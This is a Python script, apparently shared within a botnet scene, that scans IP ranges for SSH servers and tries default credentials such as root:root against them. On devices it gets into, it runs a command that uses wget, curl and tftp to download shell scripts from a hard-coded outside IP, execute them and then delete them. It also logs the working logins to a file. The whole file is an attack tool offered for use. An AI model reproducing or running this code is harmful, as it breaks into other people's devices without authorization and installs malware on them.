#ulimit -n 999999
#Made simply for Kowai
#Made by slumptheogod @telnut on instagram
#line 86 is where u can edit ranges in the script Loli
 
import threading, paramiko, random, socket, time, sys
 
paramiko.util.log_to_file("/dev/null")
 
blacklisted = ["127.0","10.0","192.168"] #You can these out add or whatever u want lol
 
#server_ip = useless atm
 
passwords = ["support:support"]
 
if sys.argv[4] == "root":
    passwords = ["root:root"]
if sys.argv[4] == "guest":
    passwords = ["guest:guest"]
if sys.argv[4] == "telnet":
    passwords = ["telnet:telnet"]
 
if len(sys.argv) < 4:
    sys.exit("Usage: python " + sys.argv[0] + " <threads> <start-range> <end-range> <passwords>")
 
print """\n\x1b[0;37m******************************
*      \x1b[0;31mSCANNER STARTING\x1b[0;37m      *
******************************\x1b[0m"""
 
def sshscanner(ip):
    global passwords
    try:
        thisipisbad='no'
        for badip in blacklisted:
            if badip in ip:
                thisipisbad='yes'
        if thisipisbad=='yes':
            sys.exit()
        username='root'
        password="0"
        port = 22
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((ip, port))
        data = str(s.recv(1024))
        if "SSH" in data:
            print("\x1b[1;35mInvalid \x1b[1;33m-- \x1b[1;35m" + ip + "\x1b[37m")
        elif "ssh" in data:
            print("\x1b[1;35mInvalid \x1b[1;33m-- \x1b[1;35m" + ip + "\x1b[37m")
        else:
            sys.exit()
        s.close()
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        dobreak=False
        for passwd in passwords: 
            if ":n/a" in passwd:
                password=""
            else:
                password=passwd.split(":")[1]
            if "n/a:" in passwd:
                username=""
            else:
                username=passwd.split(":")[0]
            try:
                ssh.connect(ip, port = port, username=username, password=password, timeout=3)
                break
            except:
                pass
        badserver=True
        stdin, stdout, stderr = ssh.exec_command("/sbin/ifconfig")
        output = stdout.read()
        if "inet addr" in output:
            badserver=False
        websites = [ ]         
        if badserver == False:
                print("\x1b[1;37mAttempting Mikrotik \x1b[1;33m-- \x1b[1;35m" + ip + ":" + username + ":" + password + "\x1b[37m")
                ssh.exec_command("cd /tmp; echo ''>DIRTEST || cd /var; echo ''>DIRTEST; wget http://104.248.251.125/8UsA.sh; curl -O http://104.248.251.125/8UsA.sh; chmod 777 8UsA.sh; sh 8UsA.sh; tftp 104.248.251.125 -c get t8UsA.sh; chmod 777 t8UsA.sh; sh t8UsA.sh; tftp -r t8UsA2.sh -g 104.248.251.125; chmod 777 t8UsA2.sh; sh t8UsA2.sh; rm -rf 8UsA.sh t8UsA.sh t8UsA2.sh")
                vulns = open("Mikrotik.txt", "a").write(username + ":" + password + ":" + ip + "\n") #This is not needed u can take it out if u want 
                time.sleep(12)
                ssh.close()
    except Exception as e:
        pass
 
 
if sys.argv[2] == "KOWAI":
    ranges = ["188.16.000.000/188.19.255.255/181.112.0.0/201.245.180.0/"]
    randomrange = random.choice(ranges)
    startrng = randomrange.split("/")[0]
    endrng = randomrange.split("/")[1]
 
if sys.argv[2] != "KOWAI":
    a = int(sys.argv[2].split(".")[0])
    b = int(sys.argv[2].split(".")[1])
    c = int(sys.argv[2].split(".")[2])
    d = int(sys.argv[2].split(".")[3])
else:
    a = int(startrng.split(".")[0])
    b = int(startrng.split(".")[1])
    c = int(startrng.split(".")[2])
    d = int(startrng.split(".")[3])
x = 0
 
while(True):
    try:
 
        if sys.argv[2] != "KOWAI":
            endaddr = sys.argv[3]
        else:
            endaddr = endrng
       
        d += 1
 
        ipaddr = str(a) + "." + str(b) + "."+str(c)+"."+str(d)
 
        if endaddr == (ipaddr or str(a) + "." + str(b) + "."+str(c)+"."+str(d-1)):
            if sys.argv[2] == "KOWAI":
                randomrange = random.choice(ranges)
                startrng = randomrange.split("/")[0]
                endrng = randomrange.split("/")[1]
                a = int(startrng.split(".")[0])
                b = int(startrng.split(".")[1])
                c = int(startrng.split(".")[2])
                d = int(startrng.split(".")[3])
            else:
                break
 
        if d > 255:
            c += 1
            d = 0
 
        if c > 255:
            b += 1
            c = 0
       
        if b > 255:
            a += 1
            b = 0
 
        ipaddr = str(a) + "." + str(b) + "."+str(c)+"."+str(d)
 
        if ipaddr == endaddr:
            if sys.argv[2] == "KOWAI":
                randomrange = random.choice(ranges)
                startrng = randomrange.split("/")[0]
                endrng = randomrange.split("/")[1]
                a = int(startrng.split(".")[0])
                b = int(startrng.split(".")[1])
                c = int(startrng.split(".")[2])
                d = int(startrng.split(".")[3])
            else:
                break
 
        if x > 500:
            time.sleep(1)
            x = 0
       
        t = threading.Thread(target=sshscanner, args=(ipaddr,))
        t.start()
       
    except Exception as e:
        pass
 
print "\x1b[37mDone\x1b[37m"